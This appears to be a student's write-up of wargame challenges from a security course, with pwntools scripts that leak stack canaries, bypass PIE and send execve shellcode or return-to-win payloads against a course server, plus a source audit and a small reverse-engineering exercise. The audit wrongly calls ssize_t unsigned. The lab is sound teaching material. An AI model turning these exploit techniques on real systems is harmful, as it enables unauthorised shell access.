shellcrack
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNS1zaGVsbGNyYWNrIiwiaXAiOiIyNy4zMy4xNzUuNjciLCJzZXNzaW9uIjoiOWI5ZmJlYjAtMWQxOC00YzE2LTgyNDMtNTk0NWU3Yjk5ZTk3In0.-VfQJtjaFTIX2yP2tcsfi1plYnXBHL5nInR21fh46qQ}

General overview of problems faced
-------------------------------------
# When looking in the binary ninja, we can see it calls fread to read in 0x10 (or 16)
# elements of size 1 bytes from stdin into a buffer. This means that when the binary 
# allows us to input, it will take the first 16 bytes of input and place it into the 
# buffer.

# Next, the program tells me to write my data to this same buffer, and it then
# calls 'gets' to write into this buffer.

# After this, it then checks the canary to ensure it hasn't been modified, and if it
# has it aborts. For example, if I enter a cyclic sequence of length 300 from within
# gdb, it prints that the canary contains value 'maaanaaa', which is at offset 48.
# Given this, we know our canary is at offset 48 from our buffer.

# Hence, we are going to want to leak the canary value from our first input. To do so,
# we notice that when we enter 15 bytes of input into the first input, the contents
# of this buffer is printed followed by some random value. However, if we overflow
# the second input, it shows the global canary that we overwrote has this same value.
# Hence, this value printed is the canary itself and we can simply extract it.

# Then, in the second input our payload should be shellcode to pop a shell, making
# sure to overwrite the canary with its value and the return address with the address
# that is printed by the program (being the address of this buffer we are writing
# into).

# In binary ninja, we know our buffer is at address var_48, meaning it is 0x48 (or 72 
# bytes) above the return address. Also, to double check our canary position, we know 
# its at address var_18, meaning it is 0x18 (or 24 bytes) above the return address,
# meaning it is 72 - 24 = 48 bytes after the start of the buffer.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 5001)

# We first input 15 bytes from the 'fread' call.
p.sendline(b"A" * 15)

# Since the canary value is then printed, we want to extract this.
p.recvuntil("A\n")
canary = p.recv(8)

# Next, the program gives us the address of our buffer, so we also extract this.
p.recvuntil("buffer[")
buffer = int(p.recvuntil("]")[:-1], 0)

# Here we have the shellcode to place at the start of our buffer, which simply pops a
# shell.
shellcode = asm("""
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov ecx, eax
mov edx, eax
mov al, SYS_execve
int 0x80
""")

# Finally we send our payload as input for the 'gets' call, which consists of the
# shellcode constructed above, followed by the canary value at offset 48, and finally
# the address of our buffer at offset 72 such that we jump back to the start of our
# payload and execute the shellcode.
p.sendline(flat({
  0: shellcode,
  48: canary,
  72: p32(buffer)
}))
```

stack-dump2
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNS1zdGFjay1kdW1wMiIsImlwIjoiMjcuMzMuMTc1LjY3Iiwic2Vzc2lvbiI6ImFiYWQzZTgwLTUzZTYtNGJjZS04Y2JjLWU1M2ZmOTViZmVhMSJ9.UAulA0Ct6ht5_TBwzsyHJIeN9D5DZcSGjc0zNVvn5QM}

General overview of problems faced
-------------------------------------
# When looking in binary ninja, there is a win function at address 0x76d. However,
# since PIE is enabled, this address will change each time we run, so we will have
# to calculate its address based on the offset from another address we leak.

# One of the options provided by the program is 'input data', which first asks for
# an int value 'len', and then reads in that many bytes from stdin into a buffer.
# Using this, we can then set the length of input as something very large like 1000,
# and then overflow the buffer by entering a large input.

# When overflowing this buffer and then attempting to exit the program, we can see
# that stack smashing has been detected, so there is a canary in place. Hence, we are
# going to have to leak the value of this canary beforehand.

# To leak the value of the canary, we know we have the option 'dump memory' which 
# given an address, will display the contents of it. So, we simply need to determine
# the address of the canary. To do so, we note that the program displays the address
# of our buffer when starting up, so if we find the offset the canary is from our
# buffer, we can determine the canary address based on this.

# In gdb, we can use the command 'canary' to display the address and value of the
# canary. Given this, we know the address of the canary is 0xffffce90, and the address
# of our buffer is at 0xffffce27, so the offset is 0x69 (or 105). Hence, we can get
# the canary address by adding 105 to the buffer address given to us, and then passing
# this address as input into the program will allow us to display its contents using
# 'dump memory'.

# Once we have this canary value, we also need to determine the address of the win
# function. Unlike the canary address, we cannot calculate the address of the win
# function based on an offset of the leaked buffer address, as they are in different
# memory regions (buffer on stack, win function in text/data region). Hence, we need
# to leak an address in this region. To do so, we can use the 'print memory map'
# option in the program, which shows the address range for each memory region.
 
# Given an address in the text/data region, we can extract this and then calculate
# the offset from this to the win function. To do so, we use gdb's command 'x win'
# to get the address of the win function 0x5663776d, and the address we extract is
# 0x56637000. Hence, the offset is 0x76d (or 1901). So, to get the win function
# address we simply add 1901 to our leaked text/data region address.

# Given all of this information, we can then perform a buffer overflow where we
# make sure to overwrite the canary with its original value, and then the return
# address with the address of the win function.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 5002)

# We want to extract the 'useful stack pointer', which is the address of the buffer.
p.recvuntil("pointer ")
buffer = int(p.recvline()[:-1], 0)

# Since we know the canary is stored 105 bytes above the buffer, we add this offset to
# the buffers address.
canaryAddress = buffer + 105

# We then select command 'input data' and send the address of the canary as input.
p.sendline("a")
p.sendline(p32(canaryAddress))

# We use command 'dump memory' to display the contents of the canary address.
p.sendline("b")

# Here we extract the canary value given by the program.
p.recvuntil("memory at ")
p.recvuntil(": ")
canaryValue = u32(p.recv(4))

# Next we want to display the 'memory map'.
p.sendline("c")

# Within this memory map showm, we want to extract the first address shown, which is
# in the text/data region as required. Since it doesn't display the '0x', we need to
# add this to the front, as well as convert it from bytes to string using decode.
leakedAddress = int("0x" + p.recvuntil("-")[-9:-1].decode("utf-8"), 0)

# Using the offset we calculated, we can now get the win functions address.
win = leakedAddress + 1901

# Finally, we want to input our buffer overflow payload. This involves selecting the
# 'input data' option, then for the length selecting a large value such as 1000 bytes,
# and then finally sending our payload which overwrites the canary to its original
# value and overwrites the return address with the win function's address.
p.sendline("a")
p.sendline(b"1000")
p.sendline(b"A"*96 + p32(canaryValue) + b"A"*8 + p32(win))

# We then use command 'quit' to return to the win function which gives us shell access
p.sendline("d")

# Given we now have shell access, we can now get the flag
p.interactive()
```

image-viewer
===========================
Flag: n/a

General overview of problems faced
-------------------------------------
# When we first load up the program, it asks for a password. Since the source code
# is provided, we can see it compares our input to 'trivial', and if equal it then
# displays several 'photos' to display. 

# Looking at option 3, we can see the filename is determine by #define FLAG, whereas
# the other photos are simply strings for their filenames. If I try to view this
# photo, it simply exits.

# I then tried to access the fourth (non-existent) item in the struct by giving
# input as '4', and it displayed 'Image id must be -143358560, but supplied id is 4'
# Hence, this suggests we can access memory outside of this struct to try and read
# the flag file (instead of viewing a photo as intended).

# So, I determined that if we give a negative number, we will be able to access a
# part of the buffer we are passing input to. I determined this was -16, ensuring that
# we add an extra byte to align the buffer. At this location in the buffer, since it
# wants an address for a filename, we can simply give it another address in this
# buffer, and at this address we can put the file we want to read. Since we know the 
# flag is always stored in a file called 'flag', we can simply use './flag\x00'.

# However, when giving the program this payload, it states 'Image id must be 3551533, 
# but supplied id is -16'. What this is doing is comparing the ascii value '61-' with
# the value '-16'. This is because the system is little endian, and it is simply
# reading the first four bytes of the buffer to compare to '-16'. Hence, we need
# these values to be equal.Unfortunately, I was unable to figure out how to achieve 
# this. Whilst changing the value of the fourth byte given as input can change the
# result, it was still too difficult to produce something remotely close to '-16'.

Script/Command used
------------------
```
p = remote("plsdonthaq.me", 5003)

# Since the password is trivial, we simply send this as input.
p.sendline(b"trivial")

# Then when asking to view a photo, we send our payload, which consists of'-16', 
# followed by any byte to align the buffer, then an address in the buffer, and finally
# at this address the string './flag\x00' as the filename.
p.sendline(b"-16"+ b"\0" + p32(0x804c068) + b"./flag\x00")

p.interactive()
```

src challenge
=================
General overview of problems faced
--------------------------------------
lines: Bug
82: The variable 'x' is of type 'ssize_t', however it is being assigned to the return value of the function 'read_socket', which returns type int. This is dangerous as the type 'ssize_t' is unsigned, whilst 'int' is, so this type conversion could lead to unexpected values that could potentially break the program.
106/120: Since there are no checks whether 'buf' is '\0' terminated, then if a large enough input was given to 'write_socket' that wasn't '\0' terminated, it would continue reading past the end of the buffer into unknown memory, resulting in a segmentation fault.
140: The variable admin_level is initially set to 0. This corresponds to the user being an admin by default, and could lead to a non-admin user accessing the 'command' function. This function allows the user to execute any command on the server based on their user controlled input, hence allowing them to run malicious code or view sensitive information.
146: Looking at the arguments for syslog in the man pages, we can see it expects a format string for its second argument. However, in this case it is being given a user controlled string rather than a constant format string. Hence, this is a format string vulnerability, which allows an attacker to read and write on the stack by including format specifiers in their input.

re challenge
=============
General overview of problems faced
-------------------------------------
To begin, we notice when looking at the assembly that rather than being the main function, we are actually looking at a function called 're_this'. Hence, we can setup this function to begin. For the program to compile, we also need to setup a main function which calls 're_this'.

Next, we notice that two variables 'arg1' and 'arg2' are loaded into registers. We can assume these are the arguments for our 're_this' function, so we can add this to the function definition. Since the assembly shows 'dword', we know these are 4 byte values, so for now we can assume they are of type 'int'.

After this initial setup, the program consists of what appears to be lots of random register computations that involve these two arguments. Through creating my own test programs and comparing the binary ninja output with the given assembly, I eventually discovered the '%' operator gives a similar result, so I assumed this is what was being used.

Next, I noticed that the assembly loaded the sum of the two arguments into a register, so I quickly realised that on the left side of the modulo was 'arg1 + arg2'. Through trying different values I also realised that the right hand side of the modulo had to be '6'. Hence, we had '(arg1 + arg2) % 6'.

Finally, we can see in the assembly that it moves the result of this operation into the 'eax' register, meaning the function returns this value. Given this, we now had the completed 're_this' function.

```C
int re_this(int arg1, int arg2) {
    return (arg1 + arg2) % 6;
}

int main(void) {
    re_this(0, 1);

    return 0;
}
``